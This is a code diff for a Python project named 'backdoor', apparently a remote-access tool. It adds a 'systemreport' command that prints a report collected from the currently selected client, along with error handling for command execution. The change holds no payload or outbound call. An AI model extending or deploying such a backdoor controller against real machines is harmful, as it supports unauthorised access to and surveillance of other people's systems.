@@ -4,7 +4,9 @@ from typing import Protocol
 
 from backdoor.exceptions.core import InvalidArgumentException
 from backdoor.files.processor import FileProcessor
-from backdoor.models.commands import Command, RemoteCommand, CommandResult
+from backdoor.models.commands import Command, LocalCommand, RemoteCommand, CommandResult
+from backdoor.server.registry import ClientRegistry
+from backdoor.utils.systemreport import format_report
 
 
 class CommandExecutor(Protocol):
@@ -32,8 +34,36 @@ class CommandExecutor(Protocol):
 
 class LocalCommandExecutor(CommandExecutor):
 
+    def __init__(self, registry: ClientRegistry) -> None:
+        self.registry = registry
+
     def execute(self, command: Command) -> CommandResult:
-        return self.delegate_execute(command)
+        try:
+            return self.__try_execute(command)
+        except Exception as e:
+            return CommandResult(
+                success=False,
+                returncode=1,
+                stderr=str(e) or "Could not execute command",
+            )
+
+    def __try_execute(self, command: Command) -> CommandResult:
+        match command:
+            case LocalCommand(command="systemreport"):
+                client = self.registry.current_client
+                if not client or not client.report:
+                    return CommandResult(
+                        success=False,
+                        returncode=1,
+                        stderr="Could not print report to current client",
+                    )
+                return CommandResult(
+                    success=True,
+                    returncode=0,
+                    stdout=format_report(client.report),
+                )
+            case _:
+                return self.delegate_execute(command)
 
 
 class RemoteCommandExecutor(CommandExecutor):
